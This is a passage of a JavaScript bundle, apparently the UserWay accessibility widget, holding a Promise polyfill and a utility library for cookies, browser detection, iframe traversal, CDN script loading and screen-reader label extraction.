!function (e) {
  function t(e) {
    return "[object Array]" === Object.prototype.toString.call(e);
  }
  function i() {
    for (var e = 0; e < E.length; e++) E[e][0](E[e][1]);
    E = [], w = !1;
  }
  function n(e, t) {
    E.push([e, t]), w || (w = !0, x(i, 0));
  }
  function a(e, t) {
    function i(e) {
      s(t, e);
    }
    function n(e) {
      l(t, e);
    }
    try {
      e(i, n);
    } catch (e) {
      n(e);
    }
  }
  function r(e) {
    var t = e.owner,
      i = t.state_,
      n = t.data_,
      a = e[i],
      r = e.then;
    if ("function" == typeof a) {
      i = b;
      try {
        n = a(n);
      } catch (e) {
        l(r, e);
      }
    }
    o(r, n) || (i === b && s(r, n), i === _ && l(r, n));
  }
  function o(e, t) {
    var i;
    try {
      if (e === t) throw new TypeError("A promises callback cannot return that same promise.");
      if (t && ("function" == typeof t || "object" == typeof t)) {
        var n = t.then;
        if ("function" == typeof n) return n.call(t, function (n) {
          i || (i = !0, t !== n ? s(e, n) : u(e, n));
        }, function (t) {
          i || (i = !0, l(e, t));
        }), !0;
      }
    } catch (t) {
      return i || l(e, t), !0;
    }
    return !1;
  }
  function s(e, t) {
    e !== t && o(e, t) || u(e, t);
  }
  function u(e, t) {
    e.state_ === m && (e.state_ = h, e.data_ = t, n(c, e));
  }
  function l(e, t) {
    e.state_ === m && (e.state_ = h, e.data_ = t, n(p, e));
  }
  function d(e) {
    var t = e.then_;
    e.then_ = void 0;
    for (var i = 0; i < t.length; i++) r(t[i]);
  }
  function c(e) {
    e.state_ = b, d(e);
  }
  function p(e) {
    e.state_ = _, d(e);
  }
  function f(e) {
    if ("function" != typeof e) throw new TypeError("Promise constructor takes a function argument");
    if (this instanceof f == !1) throw new TypeError("Failed to construct 'Promise': Please use the 'new' operator, this object constructor cannot be called as a function.");
    this.then_ = [], a(e, this);
  }
  var y = e.Promise,
    g = y && "resolve" in y && "reject" in y && "all" in y && function () {
      var e;
      return new y(function (t) {
        e = t;
      }), "function" == typeof e;
    }();
  "undefined" != typeof exports && exports ? (exports.Promise = g ? y : f, exports.Polyfill = f) : "function" == typeof define && define.amd ? define("uw_widget_components/promisePolyfil", function () {
    return g ? y : f;
  }) : g || (e.Promise = f);
  var w,
    m = "pending",
    h = "sealed",
    b = "fulfilled",
    _ = "rejected",
    v = function () {},
    x = "undefined" != typeof setImmediate ? setImmediate : setTimeout,
    E = [];
  f.prototype = {
    constructor: f,
    state_: m,
    then_: null,
    data_: void 0,
    then: function (e, t) {
      var i = {
        owner: this,
        then: new this.constructor(v),
        fulfilled: e,
        rejected: t
      };
      return this.state_ === b || this.state_ === _ ? n(r, i) : this.then_.push(i), i.then;
    },
    catch: function (e) {
      return this.then(null, e);
    }
  }, f.all = function (e) {
    var i = this;
    if (!t(e)) throw new TypeError("You must pass an array to Promise.all().");
    return new i(function (t, i) {
      for (var n, a = [], r = 0, o = 0; o < e.length; o++) n = e[o], n && "function" == typeof n.then ? n.then(function (e) {
        return r++, function (i) {
          a[e] = i, --r || t(a);
        };
      }(o), i) : a[o] = n;
      r || t(a);
    });
  }, f.resolve = function (e) {
    var t = this;
    return e && "object" == typeof e && e.constructor === t ? e : new t(function (t) {
      t(e);
    });
  }, f.reject = function (e) {
    return new this(function (t, i) {
      i(e);
    });
  };
}("undefined" != typeof window ? window : "undefined" != typeof global ? global : "undefined" != typeof self ? self : this), function () {
  Math.imul || (Math.imul = function (e, t) {
    var i = e >>> 16 & 65535,
      n = 65535 & e,
      a = t >>> 16 & 65535,
      r = 65535 & t;
    return n * r + (i * r + n * a << 16 >>> 0) | 0;
  }), Array.prototype.find = Array.prototype.find || function (e) {
    if (null === this) throw new TypeError("Array.prototype.find called on null or undefined");
    if ("function" != typeof e) throw new TypeError("callback must be a function");
    for (var t = Object(this), i = t.length >>> 0, n = arguments[1], a = 0; a < i; a++) {
      var r = t[a];
      if (e.call(n, r, a, t)) return r;
    }
  };
}(), function () {
  function e(e, t) {
    if (null == window[i].ContextHolder.lib[e]) window[i].ContextHolder.lib[e] = null != t ? t : {
      name: e
    };else if (null != t) return;
    return window[i].ContextHolder.lib[e];
  }
  function t(t) {
    return null != window[i].ContextHolder.lib[t] ? window[i].ContextHolder.lib[t] : e(t, null);
  }
  var i = "UserWayWidgetApp";
  if ("object" != typeof window[i] || !window[i].initialized) {
    var n = !!window[i] && window[i].lazyLoaded;
    window[i] = {
      addLib: e,
      getLib: t,
      ContextHolder: {
        lib: {}
      },
      initialized: !0,
      lazyLoaded: n
    };
  }
}();
var __read = this && this.__read || function (e, t) {
    var i = "function" == typeof Symbol && e[Symbol.iterator];
    if (!i) return e;
    var n,
      a,
      r = i.call(e),
      o = [];
    try {
      for (; (void 0 === t || t-- > 0) && !(n = r.next()).done;) o.push(n.value);
    } catch (e) {
      a = {
        error: e
      };
    } finally {
      try {
        n && !n.done && (i = r.return) && i.call(r);
      } finally {
        if (a) throw a.error;
      }
    }
    return o;
  },
  __spreadArray = this && this.__spreadArray || function (e, t, i) {
    if (i || 2 === arguments.length) for (var n, a = 0, r = t.length; a < r; a++) !n && a in t || (n || (n = Array.prototype.slice.call(t, 0, a)), n[a] = t[a]);
    return e.concat(n || Array.prototype.slice.call(t));
  },
  __values = this && this.__values || function (e) {
    var t = "function" == typeof Symbol && Symbol.iterator,
      i = t && e[t],
      n = 0;
    if (i) return i.call(e);
    if (e && "number" == typeof e.length) return {
      next: function () {
        return e && n >= e.length && (e = void 0), {
          value: e && e[n++],
          done: !e
        };
      }
    };
    throw new TypeError(t ? "Object is not iterable." : "Symbol.iterator is not defined.");
  };
!function () {
  function e() {}
  function t(e, t) {
    void 0 === t && (t = 0), e = "" + (e || "");
    for (var i = 3735928559 ^ t, n = 1103547991 ^ t, a = 0, r = void 0; a < e.length; a++) r = e.charCodeAt(a), i = Math.imul(i ^ r, 2654435761), n = Math.imul(n ^ r, 1597334677);
    return i = Math.imul(i ^ i >>> 16, 2246822507) ^ Math.imul(n ^ n >>> 13, 3266489909), 4294967296 * (2097151 & (n = Math.imul(n ^ n >>> 16, 2246822507) ^ Math.imul(i ^ i >>> 13, 3266489909))) + (i >>> 0);
  }
  function n(e) {
    var i = {
        s: "src",
        h: "href"
      },
      n = e.innerText ? t(e.innerText) : "";
    return Object.keys(i).reduce(function (n, a) {
      var r = i[a],
        o = e.getAttribute ? e.getAttribute(r) : "";
      return e.hasAttribute && e.hasAttribute(r) && "" !== o ? n + ";" + a + ":" + t(o) : n;
    }, "|" + n);
  }
  function a(e) {
    O(function (e) {
      if (this.head) {
        var t = this.createElement("style");
        t.innerHTML = e;
        try {
          this.head.appendChild(t);
        } catch (e) {}
      }
    }, arguments);
  }
  function r(e, t) {
    var i = document.createElement("div");
    i.innerHTML = e, i.classList.add("uw-page-structure-modal"), i.setAttribute("data-uw-feature-ignore", "true"), i.id = "uwPageStructureModal", t.isMobile && i.firstChild && i.firstChild.classList.add("uw-ps-mobile");
    var n = document.querySelector(".uw-s10-reading-guide");
    n && n.parentElement && n.parentElement.insertBefore(i, n);
  }
  function o(e, t, i, n) {
    n ? e.settings[t].value[n] = i : "object" == typeof e.settings[t] ? e.settings[t].value = i : e.settings[t] = i, e.supportsLocalStorage ? window.localStorage.setItem(t, i) : c(t);
  }
  function s(e, t, i) {
    if (void 0 === i && (i = !0), e.supportsLocalStorage) {
      var n = window.localStorage.getItem(t);
      return void 0 !== n && "undefined" !== n && null !== n && (i ? JSON.parse(n) : n);
    }
    var n = d(t);
    return void 0 !== n && "undefined" !== n && null !== n && (i ? JSON.parse(n) : n);
  }
  function u() {
    return "uw" + (~~(1e8 * Math.random())).toString(16);
  }
  function l() {
    try {
      return "localStorage" in window && null !== window.localStorage && -1 !== window.localStorage.setItem.toString().indexOf("[native code]");
    } catch (e) {
      return !1;
    }
  }
  function d(e) {
    var t = null;
    try {
      t = document.cookie.match(new RegExp("(?:^|; )" + e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"));
    } catch (e) {}
    return t ? decodeURIComponent(t[1]) : void 0;
  }
  function c(e, t, i) {
    i = i || {};
    var n = i.expires;
    if ("number" == typeof n && n) {
      var a = new Date();
      a.setTime(a.getTime() + 1e3 * n), n = i.expires = a;
    }
    n && n.toUTCString && (i.expires = n.toUTCString()), t = encodeURIComponent(t);
    var r = e + "=" + t;
    for (var o in i) if (i.hasOwnProperty(o)) {
      r += "; " + o;
      var s = i[o];
      !0 !== s && (r += "=" + s);
    }
    document.cookie = r;
  }
  function p(e, t) {
    for (var i = 0; i < t.length; i++) for (var n = 0; n < e.length; n++) if (t[i].match(new RegExp("^" + e[n] + "$"))) return !0;
    return !1;
  }
  function f(e, t, i) {
    return 1 - (.299 * e + .587 * t + .114 * i) / 255 < .5;
  }
  function y() {
    return -1 != (navigator.userAgent.indexOf("Opera") || navigator.userAgent.indexOf("OPR")) ? "opera" : -1 != navigator.userAgent.indexOf("Edge") ? "edge" : -1 != navigator.userAgent.indexOf("Chrome") ? "chrome" : -1 != navigator.userAgent.indexOf("Safari") ? "safari" : -1 != navigator.userAgent.indexOf("Firefox") ? "firefox" : -1 != navigator.userAgent.indexOf("MSIE") || document.documentMode ? "ie" : "unknown";
  }
  function g() {
    var e = navigator.userAgent || navigator.vendor,
      t = /(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino|android|ipad|playbook|silk/i,
      i = /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw-(n|u)|c55\/|capi|ccwa|cdm-|cell|chtm|cldc|cmd-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc-s|devi|dica|dmob|do(c|p)o|ds(12|-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(-|_)|g1 u|g560|gene|gf-5|g-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd-(m|p|t)|hei-|hi(pt|ta)|hp( i|ip)|hs-c|ht(c(-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i-(20|go|ma)|i230|iac( |-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|-[a-w])|libw|lynx|m1-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|-([1-8]|c))|phil|pire|pl(ay|uc)|pn-2|po(ck|rt|se)|prox|psio|pt-g|qa-a|qc(07|12|21|32|60|-[2-7]|i-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h-|oo|p-)|sdk\/|se(c(-|0|1)|47|mc|nd|ri)|sgh-|shar|sie(-|m)|sk-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h-|v-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl-|tdg-|tel(i|m)|tim-|t-mo|to(pl|sh)|ts(70|m-|m3|m5)|tx-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas-|your|zeto|zte-/i;
    return t.test(e) || i.test(e.substring(0, 4)) || "ontouchstart" in document.documentElement;
  }
  function w() {
    return document.location.href;
  }
  function m(e, t) {
    void 0 === t && (t = []);
    var i = t.length ? t : ["userway"];
    e.isUserWay = !0, P.next(e), i.forEach(function (t) {
      var i = window.frames[t];
      if (!i || "function" != typeof i.postMessage) try {
        i = document.querySelector("iframe[name=" + t + "]"), i = i ? i.contentWindow : null;
      } catch (e) {}
      i && i.postMessage(e, "*");
    });
  }
  function h(e) {
    return -1 === ["#text", "#comment"].indexOf(e.nodeName);
  }
  function b(e) {
    return "none" === window.getComputedStyle(e).display;
  }
  function _(e) {
    if (!h(e)) return !1;
    var t = e.getAttribute("aria-hidden"),
      i = e.getAttribute("hidden");
    return b(e) || "true" === t || i || "" === i;
  }
  function v(e) {
    if (void 0 !== e.checked) return e.checked;
    var t = e.getAttribute("aria-checked") || "";
    return t ? t = "true" === t.toLowerCase() : null;
  }
  function x(e) {
    var t = e.getAttribute("required"),
      i = e.getAttribute("aria-required") || "";
    return null != t || "true" === i.toLowerCase();
  }
  function E(e, t, i) {
    if (Array.isArray(t) && 0 !== t.length) try {
      i.push(e(t[0])), E(e, t.slice(1), i);
    } catch (n) {
      return E(e, t.slice(1), i);
    }
    return i;
  }
  function L(e) {
    if (e.hasAttribute(M)) return !0;
    for (var t = e.parentElement, i = !1; t && "BODY" !== t.tagName.toUpperCase();) {
      if (t.hasAttribute(M)) {
        i = !0;
        break;
      }
      t = t.parentElement;
    }
    return i;
  }
  function S(e) {
    return [].slice.call(e.getElementsByTagName("iframe"));
  }
  function A() {
    var e = [],
      t = function (i) {
        var n, a;
        try {
          for (var r = __values(i), o = r.next(); !o.done; o = r.next()) {
            var s = o.value;
            e.push(s);
            var u = [];
            try {
              u = S(s.contentWindow.document);
            } catch (e) {}
            u.length && t(u);
          }
        } catch (e) {
          n = {
            error: e
          };
        } finally {
          try {
            o && !o.done && (a = r.return) && a.call(r);
          } finally {
            if (n) throw n.error;
          }
        }
      };
    t(S(document));
    var i = e.filter(function (e) {
      return -1 === ["userway_iframe_aria_editor", "uwif"].indexOf(e.className) && !L(e);
    });
    return E(function (e) {
      return e.contentWindow.document;
    }, i, []);
  }
  function T(e, t) {
    return new Promise(function (i, n) {
      O(function () {
        if (this.getElementById(e)) return !1;
        var a = this.head,
          r = this.createElement("link");
        r.type = "text/css", r.rel = "stylesheet", r.id = e, r.href = t, r.onload = function () {
          return i();
        }, r.onerror = function (e) {
          return n(e);
        }, a.appendChild(r);
      });
    });
  }
  function k(e, t, i, n) {
    var a = void 0,
      r = document.body || document.head;
    a = document.createElement("script"), a.onload = function () {
      t && t();
    }, a.src = e, i && i.charset && (a.charset = i.charset), i && i.id && (a.id = i.id), n && (a.crossOrigin = "anonymous", a.integrity = n), r.appendChild(a);
  }
  function W(e, t, i) {
    e.scrollIntoView({
      block: "start",
      behavior: "auto"
    }), t && i > 0 && setTimeout(function () {
      var n = e.getBoundingClientRect();
      (n.top < 0 || n.top >= (window.innerHeight || document.documentElement.clientHeight)) && W(e, t, i - 1);
    }, t);
  }
  function O(e, t) {
    var i = A();
    [document].concat(i).forEach(function (i) {
      e.apply(i, t);
    });
  }
  function C(e) {
    function t(e, t) {
      window.URL = window.URL || window.webkitURL;
      var i = document.createElement("a"),
        n = new Blob([e]),
        a = window.URL.createObjectURL(n);
      i.href = a, i.download = t, i.click(), window.URL.revokeObjectURL(a);
    }
    var i = e.substring(e.lastIndexOf("/") + 1);
    !function (e, t, i) {
      var n = new XMLHttpRequest();
      n.open("get", e, !0), i.responseType && (n.responseType = i.responseType), n.onreadystatechange = function () {
        4 === n.readyState && 200 === n.status && t(n);
      }, n.send();
    }(e, function (e) {
      t(e.response, i);
    }, {
      responseType: "blob"
    });
  }
  function I(e) {
    var t,
      i = function (e) {
        return e && "input" === e.tagName.toLowerCase() && e.hasAttribute("matinput");
      };
    return {
      materialInputLabelContainer: i(null === e || void 0 === e ? void 0 : e.previousElementSibling) && e,
      materialInputLabelContainerDescendants: i(null === (t = null === e || void 0 === e ? void 0 : e.parentElement) || void 0 === t ? void 0 : t.previousElementSibling) && e.parentElement.querySelectorAll("*")
    };
  }
  var U = "https://cdn.userway.org/",
    N = window.UserWayWidgetApp.addLib("util"),
    M = "data-uw-iframe-ignore",
    P = window.UserWayWidgetApp.getLib("message-stream"),
    R = UserWayWidgetApp.getLib("inlineStyling");
  N.firedEvents = {}, N.LIFE_CYCLE_EVENT = {
    INIT: "userway:init_completed",
    RENDER: "userway:render_completed",
    REMEDIATION: "userway:remediation_completed",
    FEATURE_ENABLED_BASE: "userway:feature_enabled_",
    FEATURE_DISABLED_BASE: "userway:feature_disabled_",
    REMEDIATION_IMAGE_ALT_FINISHED: "userway:remediation_image_alt_finished",
    REMEDIATION_CSR_LOADED: "userway:remediation_csr_loaded"
  }, N.PROCESSING_EVENT = {
    REMEDIATION_FORCE_RERUN: "userway:remediation_force_rerun"
  }, N.DELAYS = {
    SHORT: 100,
    MEDIUM: 500,
    LONG: 1e3
  };
  var F = ["STYLE", "SCRIPT", "NOSCRIPT", "TEMPLATE"];
  N.supportsPassive = !1;
  try {
    var D = Object.defineProperty({}, "passive", {
      get: function () {
        N.supportsPassive = !0;
      }
    });
    window.addEventListener("testPassive", null, D), window.removeEventListener("testPassive", null, D);
  } catch (e) {}
  N.init = e, N.isSafari = /^((?!chrome|android).)*safari/i.test(navigator.userAgent), N.iOSMobile = /(iphone|ipod|ipad).* os /.test(navigator.userAgent.toLowerCase()), N.isChromeExtensionEnv = function () {
    return "object" == typeof chrome && "object" == typeof chrome.extension;
  }, N.request = function (e) {
    return new Promise(function (t, i) {
      "string" != typeof e.url && i({});
      var n = new XMLHttpRequest(),
        a = "string" == typeof e.method && -1 !== ["GET", "HEAD", "POST", "PUT", "DELETE", "CONNECT", "OPTIONS", "TRACE", "PATCH"].indexOf(e.method.toUpperCase()) ? e.method.toUpperCase() : "GET";
      e.body && "GET" === a && Object.keys(e.body).forEach(function (t, i) {
        e.url = 0 === i ? e.url + "?" + t + "=" + e.body[t] : e.url + "&" + t + "=" + e.body[t];
      }), n.open(a, e.url), "object" == typeof e.header && Object.keys(e.header).forEach(function (t) {
        n.setRequestHeader(t, e.header[t]);
      }), n.onload = function () {
        200 === n.status ? t(n) : i(n);
      }, n.onerror = function () {
        i(n);
      }, n.onabort = function () {
        i(n);
      }, n.send(e.body ? JSON.stringify(e.body) : null);
    });
  }, N.customTrim = function (e) {
    return e ? e = e.trim().replace(/(\n|\r\n)/g, "").replace(/\s+/g, " ").replace(/\u200B/g, "") : "";
  }, N.customTextContent = function (e, t) {
    void 0 === t && (t = 3);
    var i = function (e, t) {
      if (t < 1) return "";
      var n = e.childElementCount,
        a = "";
      return n || (a += e.textContent), !a && e.length && (a += e.nodeValue), n && e.childNodes.length && (a += __spreadArray([], __read(e.childNodes), !1).map(function (e) {
        return i(e, t - 1);
      }).join(" ")), a;
    };
    return i(e, t);
  }, N.execJs = function (e, t) {
    if ("string" == typeof e) return new Promise(function (i, n) {
      var a = document.createElement("script");
      t && (a.crossOrigin = "anonymous", a.integrity = t), (document.body || document.head).appendChild(a), a.onload = function () {
        i(a);
      }, a.onerror = function () {
        n(a);
      }, a.src = e;
    });
  }, N.xpath = function e(t, i) {
    if (void 0 === i && (i = !1), t === document.documentElement) return "/HTML";
    if (t === document.body) return "/HTML/BODY";
    if (t === document.head) return "/HTML/HEAD";
    for (var a = 0, r = t.parentNode ? t.parentNode.childNodes : [], o = t, s = 0; o && o.tagName;) o = o.parentNode, s++;
    for (var u = 0; u < r.length; u++) {
      var l = r[u];
      if (l === t) return e(t.parentNode, !0) + "/" + t.tagName + "[" + (a + 1) + "]" + (i ? "" : n(t));
      1 === l.nodeType && l.tagName === t.tagName && a++, l.nodeType === Node.TEXT_NODE && t.nodeType === Node.TEXT_NODE && a++;
    }
  }, N.visible = function (e) {
    if (null !== e.offsetParent) return !0;
    var t = window.getComputedStyle(e);
    return "fixed" === t.position && "none" !== t.display;
  }, N.hashString = t, N.addStyleString = a, N.addStylesheet = function () {
    for (var e = [], t = 0; t < arguments.length; t++) e[t] = arguments[t];
    return new Promise(function (t, i) {
      O(function (e) {
        var n = document.createElement("link");
        document.head.appendChild(n), n.onload = function () {
          t(n);
        }, n.onerror = function () {
          i(n);
        }, n.href = e, n.type = "text/css", n.rel = "stylesheet";
      }, e);
    });
  }, N.addPageStructureModal = r, N.setProperty = o, N.removeProperty = function (e, t) {
    delete e.settings[t], e.supportsLocalStorage && window.localStorage.removeItem(t);
  }, N.getProperty = s, N.generateRandomId = u, N.supportsLocalStorage = l, N.getCookie = d, N.setCookie = c, N.someInArray = p, N.colourIsLight = f, N.detectBrowser = y, N.isMobile = g, N.isLightHouse = function () {
    return navigator.userAgent.match(/lighthouse/i);
  }, N.getHref = w, N.postMessage = m, N.postMessageWithNotification = function (e, t, i) {
    var n = function (e) {
        var r = e.data || {};
        r.isUserWay && r.action === t && (a(), i(r), window.removeEventListener("message", n));
      },
      a = function (t, i) {
        void 0 === i && (i = 10);
        var a = !1,
          r = 1,
          o = function (s) {
            return void 0 === s && (s = 1e3), setTimeout(function () {
              if (t(), r += 1, !a) {
                if (!(r < i)) throw window.removeEventListener("message", n), new Error("Post Messages limit reached! \nCalled: " + JSON.stringify(e));
                o(s);
              }
            }, s);
          };
        t();
        var s = o();
        return {
          stop: function () {
            a = !0, window.clearTimeout(s);
          }
        };
      }(function () {
        return m(e);
      }).stop;
    window.addEventListener("message", n);
  }, N.assertPostMessageOriginAllowed = function (e) {
    return !!e && 0 === U.indexOf(e);
  }, N.registerPostMessageListener = function (e) {
    window.addEventListener("message", function (t) {
      var i = t.origin.replace("localhost", "127.0.0.1");
      N.assertPostMessageOriginAllowed(i) && e(t);
    });
  }, N.isElementNode = h, N.isHideFromReaders = _, N.isChecked = v, N.isRequiredElement = x, N.mergeObjects = function (e) {
    return e.reduce(function (e, t) {
      return Object.keys(t).forEach(function (i) {
        e[i] = t[i];
      }), e;
    }, {});
  }, N.instantiateTreeWalker = function (e, t) {
    function i() {
      return NodeFilter.FILTER_ACCEPT;
    }
    var n;
    if (null == t && (t = document), /Trident\/|MSIE/.test(navigator.userAgent)) {
      var a = i;
      a.acceptNode = i, n = t.createTreeWalker(e, NodeFilter.SHOW_TEXT, a, !1);
    } else n = t.createTreeWalker(e, NodeFilter.SHOW_TEXT, null);
    return n;
  }, N.getIframes = A, N.hasTextContent = function (e) {
    var t = N.customTrim(e.textContent);
    if (t && t.length) {
      var i = e.parentNode;
      if (i && -1 === F.indexOf(i.nodeName.toUpperCase())) return !0;
    }
    return !1;
  }, N.addUwStylesheetMetropolisFont = function (e) {
    return T("uw-stylesheet-metro", N.isChromeExtensionEnv() ? chrome.extension.getURL("metropolis.css") : e.cdn + "widgetapp/bundles/metropolis/metropolis.css");
  }, N.addUwStylesheetUDFFont = function (e) {
    return T("uw-stylesheet-udf", e.cdn + "widgetapp/bundles/udf/udf.css");
  }, N.loadDeferredJs = function (e, t, i, n, a) {
    function r() {
      o = !0, t();
    }
    var o = !1;
    try {
      "function" == typeof define && define.amd ? (window.curl && (e += "?"), k(e, r, n, a)) : k(e, r, n, a);
    } catch (e) {
      i(e);
    }
    setTimeout(function () {
      o || i("Timeout to load script after 3 sec.");
    }, 3e3);
  }, N.scrollToElementWithOffset = function (e, t, i) {
    void 0 === t && (t = null), void 0 === i && (i = 10), e.classList.contains("screen-reader-text") || W(e, t, i);
  }, N.scrollToElement = W, N.findLabelForControlElement = function (e) {
    function t(e) {
      return e ? "LABEL" === e.tagName ? e : t(e.parentNode) : null;
    }
    var i = t(e.parentNode);
    if (i) return N.composeElementTextRepresentation(i, "");
    if (e.getAttribute("aria-label")) return e.getAttribute("aria-label");
    if (e.getAttribute("aria-labelledby")) return N.getLabelledByElements(e.getAttribute("aria-labelledby"));
    if (e.id) {
      var n = function (e) {
        for (var t = document.querySelectorAll("LABEL"), i = 0; i < t.length; i++) if (t[i].htmlFor === e) return t[i];
        return null;
      }(e.id);
      if (n) return N.composeElementTextRepresentation(n, "");
    }
    return e.getAttribute("title") ? e.getAttribute("title") : N.composeElementTextRepresentation(e, "") || "";
  }, N.getLabelledByElements = function (e) {
    for (var t = e.split(" "), i = "", n = 0; n < t.length; n++) {
      var a = document.getElementById(t[n]);
      a && (i = " " + N.composeElementTextRepresentation(a, i));
    }
    return i;
  }, N.composeElementTextRepresentation = function (e, t) {
    function i(e) {
      for (var n = 0; n < e.length; n++) {
        var a = e[n];
        if (a.nodeType !== Node.COMMENT_NODE) if (a.nodeType === Node.TEXT_NODE) t += " " + a.textContent.trim().replace(/(\n|\r\n)/g, "");else if (a.nodeType === Node.ELEMENT_NODE) {
          if ("NOSCRIPT" === a.tagName || "SCRIPT" === a.tagName || "style" === a.tagName) continue;
          if (N.isHideFromReaders(a)) continue;
          var r = a.getAttribute("aria-hidden"),
            o = a.getAttribute("alt"),
            s = a.getAttribute("aria-label");
          if (!r || "false" === r) {
            if (s) {
              t += " " + s;
              continue;
            }
            o && (t += o + " "), "IMG" !== a.tagName && i(a.childNodes);
          }
        }
      }
    }
    return void 0 === t && (t = ""), i(e.childNodes), t.replace(/\s+/g, " ").trim();
  }, N.foundFocusable = function (e) {
    return e && e.querySelectorAll ? [].slice.call(e.querySelectorAll('button, [href], input, select, textarea, [tabindex]:not([tabindex="-1"])')).sort(function (e, t) {
      var i = +e.getAttribute("tabindex") || 0,
        n = +t.getAttribute("tabindex") || 0;
      return i ? i - n : n;
    }) : [];
  }, N.containsIframes = function (e) {
    return "IFRAME" === e.tagName || !(!e.children || !e.children.length) && [].slice.call(e.children).filter(function (e) {
      return arguments.callee(e);
    }).length > 0;
  }, N.getParents = function (e) {
    return "BODY" === e.nodeName ? [e] : arguments.callee(e.parentElement).concat(e);
  }, N.isFirstAboveSecond = function (e, t, n) {
    if (null == n && (n = 0), e[n] === t[n]) return null != e[i] && arguments.callee(e, t, n + 1);
    var a = e[n] ? indow.getComputedStyle(e[n]).zIndex : "auto",
      r = t[n] ? window.getComputedStyle(t[n]).zIndex : "auto";
    return a === r ? arguments.callee(e, t, n + 1) : ("auto" === a ? -.5 : +a) > ("auto" === r ? -.5 : +r);
  };
  N.getUserWayIconElementTitle = function (e) {
    return (0, window.UserWayWidgetApp.getLib("localization_manager").translate)(e.language, "widget.html_title") || "Accessibility Menu";
  }, N.getModalCompanyLogoSource = function (e) {
    var t = e.cdn + "widgetapp/images/logo-grey.svg",
      i = function (e) {
        return "https://userway.org?utm_source=" + e + "&utm_medium=page_structure&utm_campaign=widget";
      }(e.tunings.site_name);
    return e.services && e.services.CUSTOM_BRANDING && e.services.CUSTOM_BRANDING.custom_logo_image_path ? (t = e.services.CUSTOM_BRANDING.custom_logo_image_path, i = e.services.CUSTOM_BRANDING.custom_logo_image_link) : e.services && e.services.WHITE_LABEL && e.services.WHITE_LABEL.hide_logo && (t = "", i = ""), {
      src: t,
      url: i
    };
  }, N.hexToRgb = function (e) {
    var t = e.toString(16).match(/[a-f0-9]{6}|[a-f0-9]{3}/i);
    if (!t) return [0, 0, 0];
    var i = t[0];
    3 === t[0].length && (i = i.split("").map(function (e) {
      return e + e;
    }).join(""));
    var n = parseInt(i, 16);
    return [n >> 16 & 255, n >> 8 & 255, 255 & n];
  }, N.fireForceRemediationRerunEvent = function () {
    N.fireUserWayLifeCycleEvent(N.PROCESSING_EVENT.REMEDIATION_FORCE_RERUN);
  }, N.fireUserWayRemediationCompletedEvent = function (e) {
    N.fireUserWayLifeCycleEvent(N.LIFE_CYCLE_EVENT.REMEDIATION, e);
  }, N.fireUserWayLifeCycleEvent = function (e, t) {
    void 0 === t && (t = null), N.firedEvents[e] = t;
    var i = {
      userWayInstance: window.UserWay
    };
    t && (i = N.mergeObjects([i, t]));
    try {
      var n,
        a = N.detectBrowser();
      "ie" === a ? (n = document.createEvent("CustomEvent"), n.initCustomEvent(e, !0, !0, i)) : n = new CustomEvent(e, {
        detail: i
      }), document.dispatchEvent(n);
    } catch (e) {}
  }, N.isElementVisible = function (e) {
    return !!(e.offsetWidth || e.offsetHeight || e.getClientRects().length);
  }, N.isInView = function (e) {
    var t = e.getBoundingClientRect();
    return t.top >= 0 && t.left >= 0 && t.bottom <= document.body.getBoundingClientRect().bottom && t.right <= document.body.getBoundingClientRect().right;
  }, N.isPartOfElementInViewport = function (e) {
    for (var t = e.offsetTop, i = e.offsetLeft, n = e.offsetWidth, a = e.offsetHeight; e.offsetParent;) e = e.offsetParent, t += e.offsetTop, i += e.offsetLeft;
    return t < window.pageYOffset + window.innerHeight && i < window.pageXOffset + window.innerWidth && t + a > window.pageYOffset && i + n > window.pageXOffset;
  }, N.containsInnerText = function (e) {
    return !!e.innerText;
  }, N.validateElementAccessibility = function (e) {
    return N.isElementVisible(e) && N.containsInnerText(e);
  }, N.addScreenRearedElement = function (e, t, i) {
    void 0 === i && (i = "");
    var n = document.createElement("span");
    return n.textContent = t, n.setAttribute("style", "color: #ffffff!important;background: #000000!important;clip: rect(1px, 1px, 1px, 1px)!important;clip-path: inset(50%)!important;height: 1px!important;width: 1px!important;margin: -1px!important;overflow: hidden!important;padding: 0!important;position: absolute!important;"), n.setAttribute("class", i), n.setAttribute("data-uw-rm-ignore", ""), e.appendChild(n), n;
  }, N.getViewport = function () {
    return {
